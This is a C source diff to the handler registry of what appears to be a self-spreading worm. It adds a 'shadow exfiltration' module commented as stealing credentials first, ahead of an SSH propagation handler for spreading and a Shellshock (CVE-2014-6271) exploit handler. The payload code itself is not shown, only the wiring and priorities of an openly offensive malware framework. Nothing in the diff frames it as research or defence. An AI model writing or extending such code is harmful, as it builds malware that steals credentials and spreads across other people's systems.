@@ -1,6 +1,7 @@
 #include "handler_registry.h"
 #include "cve_2014_6271.h"  // Include CVE handler files
 #include "cve_ssh_propagation.h"  // Include SSH propagation handler
+#include "cve_shadow_exfiltration.h"  // Include shadow exfiltration handler
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -16,19 +17,26 @@ static int num_handlers = 0;
 void init_handler_registry(void) {
     num_handlers = 0;
     
-    // Register Shellshock (CVE-2014-6271) handler
-    handlers[0].cve_id = CVE_2014_6271;
-    handlers[0].scan_func = cve_2014_6271_scan;
-    handlers[0].exec_func = cve_2014_6271_execute;
-    handlers[0].priority_order = 1;
+    // Register Shadow Exfiltration handler (highest priority - steal credentials first)
+    handlers[0].cve_id = CVE_SHADOW_EXFILTRATION;
+    handlers[0].scan_func = cve_shadow_exfiltration_scan;
+    handlers[0].exec_func = cve_shadow_exfiltration_execute;
+    handlers[0].priority_order = -1;  // Highest priority (negative = highest)
     num_handlers = 1;
     
-    // Register SSH Propagation handler (highest priority for spreading)
+    // Register SSH Propagation handler (second priority for spreading)
     handlers[1].cve_id = CVE_SSH_PROPAGATION;
     handlers[1].scan_func = cve_ssh_propagation_scan;
     handlers[1].exec_func = cve_ssh_propagation_execute;
-    handlers[1].priority_order = 0;  // Highest priority (spread first)
+    handlers[1].priority_order = 0;  // Second priority (spread after exfiltration)
     num_handlers = 2;
+    
+    // Register Shellshock (CVE-2014-6271) handler
+    handlers[2].cve_id = CVE_2014_6271;
+    handlers[2].scan_func = cve_2014_6271_scan;
+    handlers[2].exec_func = cve_2014_6271_execute;
+    handlers[2].priority_order = 1;  // Lower priority
+    num_handlers = 3;
 }
 
 // Get handler by CVE ID
